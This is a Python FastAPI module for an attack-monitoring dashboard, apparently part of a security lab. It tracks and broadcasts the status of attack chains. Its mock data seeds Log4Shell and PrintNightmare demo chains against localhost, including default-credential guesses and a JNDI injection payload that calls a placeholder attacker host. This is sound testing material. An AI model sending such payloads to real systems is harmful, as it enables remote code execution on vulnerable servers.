"""
Attack monitoring API endpoints
"""

import logging
import uuid
from datetime import datetime, timedelta
from typing import List, Optional

from fastapi import APIRouter, HTTPException, Query

from ..models import (
    AttackChain,
    AttackStatus,
    AttackStep,
    AttackSummary,
    BaseResponse,
    WebSocketMessage,
)
from ..websocket_manager import websocket_manager

logger = logging.getLogger(__name__)
router = APIRouter()

# Mock data storage (in production, this would be a database)
attack_chains: List[AttackChain] = []
attack_steps: List[AttackStep] = []


@router.get("/", response_model=List[AttackChain])
async def get_attacks(
    status: Optional[AttackStatus] = Query(None, description="Filter by attack status"),
    limit: int = Query(50, description="Maximum number of attacks to return"),
):
    """Get all attack chains"""
    try:
        filtered_attacks = attack_chains

        if status:
            filtered_attacks = [a for a in filtered_attacks if a.status == status]

        return filtered_attacks[:limit]
    except Exception as e:
        logger.error(f"Error getting attacks: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/{attack_id}", response_model=AttackChain)
async def get_attack(attack_id: str):
    """Get specific attack chain by ID"""
    try:
        for attack in attack_chains:
            if attack.id == attack_id:
                return attack

        raise HTTPException(status_code=404, detail="Attack not found")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting attack {attack_id}: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/summary/stats", response_model=AttackSummary)
async def get_attack_summary():
    """Get attack statistics summary"""
    try:
        total_attacks = len(attack_chains)
        running_attacks = len([a for a in attack_chains if a.status == AttackStatus.RUNNING])
        completed_attacks = len([a for a in attack_chains if a.status == AttackStatus.COMPLETED])
        failed_attacks = len([a for a in attack_chains if a.status == AttackStatus.FAILED])

        success_rate = (completed_attacks / total_attacks * 100) if total_attacks > 0 else 0

        # Calculate average duration
        completed_with_duration = [a for a in attack_chains if a.duration is not None]
        average_duration = (
            sum(a.duration for a in completed_with_duration) / len(completed_with_duration)
            if completed_with_duration
            else 0
        )

        return AttackSummary(
            total_attacks=total_attacks,
            running_attacks=running_attacks,
            completed_attacks=completed_attacks,
            failed_attacks=failed_attacks,
            success_rate=success_rate,
            average_duration=average_duration,
        )
    except Exception as e:
        logger.error(f"Error getting attack summary: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/current/running", response_model=List[AttackChain])
async def get_running_attacks():
    """Get currently running attacks"""
    try:
        running = [a for a in attack_chains if a.status == AttackStatus.RUNNING]
        return running
    except Exception as e:
        logger.error(f"Error getting running attacks: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")


@router.post("/", response_model=AttackChain)
async def create_attack(attack: AttackChain):
    """Create a new attack chain"""
    try:
        # Generate ID if not provided
        if not attack.id:
            attack.id = str(uuid.uuid4())

        # Set start time
        attack.start_time = datetime.now()
        attack.status = AttackStatus.PENDING

        attack_chains.append(attack)

        # Broadcast to WebSocket clients
        await websocket_manager.broadcast({"type": "attack_created", "data": attack.dict()})

        logger.info(f"Created attack chain: {attack.id}")
        return attack
    except Exception as e:
        logger.error(f"Error creating attack: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")


@router.put("/{attack_id}/status", response_model=AttackChain)
async def update_attack_status(attack_id: str, status: AttackStatus):
    """Update attack status"""
    try:
        for attack in attack_chains:
            if attack.id == attack_id:
                old_status = attack.status
                attack.status = status

                # Update timing
                if status == AttackStatus.RUNNING and not attack.start_time:
                    attack.start_time = datetime.now()
                elif status in [
                    AttackStatus.COMPLETED,
                    AttackStatus.FAILED,
                    AttackStatus.CANCELLED,
                ]:
                    attack.end_time = datetime.now()
                    if attack.start_time:
                        attack.duration = (attack.end_time - attack.start_time).total_seconds()

                # Broadcast to WebSocket clients
                await websocket_manager.broadcast(
                    {
                        "type": "attack_status_updated",
                        "data": {
                            "attack_id": attack_id,
                            "old_status": old_status,
                            "new_status": status,
                            "attack": attack.dict(),
                        },
                    }
                )

                logger.info(f"Updated attack {attack_id} status: {old_status} -> {status}")
                return attack

        raise HTTPException(status_code=404, detail="Attack not found")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error updating attack status: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")


@router.put("/{attack_id}/steps/{step_id}", response_model=AttackStep)
async def update_attack_step(attack_id: str, step_id: str, step: AttackStep):
    """Update attack step"""
    try:
        for attack in attack_chains:
            if attack.id == attack_id:
                for i, existing_step in enumerate(attack.steps):
                    if existing_step.id == step_id:
                        # Update step
                        attack.steps[i] = step

                        # Update attack progress
                        completed_steps = len(
                            [s for s in attack.steps if s.status == AttackStatus.COMPLETED]
                        )
                        attack.completed_steps = completed_steps
                        attack.success_rate = (
                            (completed_steps / attack.total_steps * 100)
                            if attack.total_steps > 0
                            else 0
                        )

                        # Broadcast to WebSocket clients
                        await websocket_manager.broadcast(
                            {
                                "type": "attack_step_updated",
                                "data": {
                                    "attack_id": attack_id,
                                    "step": step.dict(),
                                    "attack_progress": {
                                        "completed_steps": attack.completed_steps,
                                        "total_steps": attack.total_steps,
                                        "success_rate": attack.success_rate,
                                    },
                                },
                            }
                        )

                        logger.info(f"Updated attack step {step_id} in attack {attack_id}")
                        return step

        raise HTTPException(status_code=404, detail="Attack or step not found")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error updating attack step: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")


@router.delete("/{attack_id}", response_model=BaseResponse)
async def delete_attack(attack_id: str):
    """Delete an attack chain"""
    try:
        for i, attack in enumerate(attack_chains):
            if attack.id == attack_id:
                deleted_attack = attack_chains.pop(i)

                # Broadcast to WebSocket clients
                await websocket_manager.broadcast(
                    {"type": "attack_deleted", "data": {"attack_id": attack_id}}
                )

                logger.info(f"Deleted attack chain: {attack_id}")
                return BaseResponse(message=f"Attack {attack_id} deleted successfully")

        raise HTTPException(status_code=404, detail="Attack not found")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error deleting attack: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")


# Mock data for testing
def create_mock_attacks():
    """Create mock attack data for testing"""
    global attack_chains

    # Log4Shell Attack Chain
    log4shell_steps = [
        AttackStep(
            id="step_1",
            name="Authentication Bypass",
            description="Bypass authentication using weak credentials",
            status=AttackStatus.COMPLETED,
            target="http://localhost:8085/api/v1/login",
            payload="admin:admin123",
            start_time=datetime.now() - timedelta(minutes=5),
            end_time=datetime.now() - timedelta(minutes=4),
            duration=60.0,
        ),
        AttackStep(
            id="step_2",
            name="Log Injection",
            description="Inject JNDI payload into logging endpoint",
            status=AttackStatus.RUNNING,
            target="http://localhost:8085/api/v1/log",
            payload="${jndi:ldap://attacker.com/exploit}",
            start_time=datetime.now() - timedelta(minutes=1),
        ),
    ]

    log4shell_attack = AttackChain(
        id="attack_log4shell_001",
        name="Log4Shell (CVE-2021-44228)",
        description="2-step attack: Authentication bypass + Log injection with JNDI lookup",
        status=AttackStatus.RUNNING,
        steps=log4shell_steps,
        total_steps=2,
        completed_steps=1,
        start_time=datetime.now() - timedelta(minutes=5),
        success_rate=50.0,
    )

    # PrintNightmare Attack Chain
    printnightmare_steps = [
        AttackStep(
            id="step_1",
            name="Service Discovery",
            description="Discover print spooler service",
            status=AttackStatus.COMPLETED,
            target="http://localhost:8085/api/v2/discover",
            payload="192.168.1.100",
            start_time=datetime.now() - timedelta(minutes=10),
            end_time=datetime.now() - timedelta(minutes=9),
            duration=60.0,
        ),
        AttackStep(
            id="step_2",
            name="Authentication",
            description="Authenticate to print spooler",
            status=AttackStatus.COMPLETED,
            target="http://localhost:8085/api/v2/auth",
            payload="printadmin:print123",
            start_time=datetime.now() - timedelta(minutes=8),
            end_time=datetime.now() - timedelta(minutes=7),
            duration=60.0,
        ),
        AttackStep(
            id="step_3",
            name="Print Spooler Exploitation",
            description="Exploit print spooler vulnerability",
            status=AttackStatus.PENDING,
            target="http://localhost:8085/api/v2/exploit",
            payload="exploit_hash",
        ),
    ]

    printnightmare_attack = AttackChain(
        id="attack_printnightmare_001",
        name="PrintNightmare (CVE-2021-34527)",
        description="3-step attack: Discovery + Authentication + Exploitation",
        status=AttackStatus.RUNNING,
        steps=printnightmare_steps,
        total_steps=3,
        completed_steps=2,
        start_time=datetime.now() - timedelta(minutes=10),
        success_rate=66.67,
    )

    attack_chains = [log4shell_attack, printnightmare_attack]


# Initialize mock data
create_mock_attacks()
